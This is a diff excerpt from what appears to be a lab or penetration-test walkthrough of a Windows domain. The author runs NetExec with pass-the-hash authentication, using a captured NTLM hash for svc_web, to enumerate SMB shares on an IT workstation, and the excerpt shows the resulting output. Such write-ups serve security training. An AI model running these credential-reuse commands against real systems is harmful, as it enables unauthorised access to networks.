@@ -794,3 +794,18 @@ WEB-01$
 
 Ill grab all the users in the domain!
 
+```python
+nxc smb it-ws01.ctos.corp -u 'svc_web' -H '4014777d5f38cb74d24f096972f47969' --shares                                                                             
+SMB         10.1.206.115    445    IT-WS01          [*] Windows Server 2022 Build 20348 x64 (name:IT-WS01) (domain:CTOS.CORP) (signing:False) (SMBv1:None)
+SMB         10.1.206.115    445    IT-WS01          [+] CTOS.CORP\svc_web:4014777d5f38cb74d24f096972f47969 
+SMB         10.1.206.115    445    IT-WS01          [*] Enumerated shares
+SMB         10.1.206.115    445    IT-WS01          Share           Permissions     Remark
+SMB         10.1.206.115    445    IT-WS01          -----           -----------     ------
+SMB         10.1.206.115    445    IT-WS01          ADMIN$                          Remote Admin
+SMB         10.1.206.115    445    IT-WS01          C$                              Default share
+SMB         10.1.206.115    445    IT-WS01          IPC$            READ            Remote IPC
+SMB         10.1.206.115    445    IT-WS01          IT_Onboarding   READ
+```
+
+I do have read on a non-default SMB share on the IT workstation
+
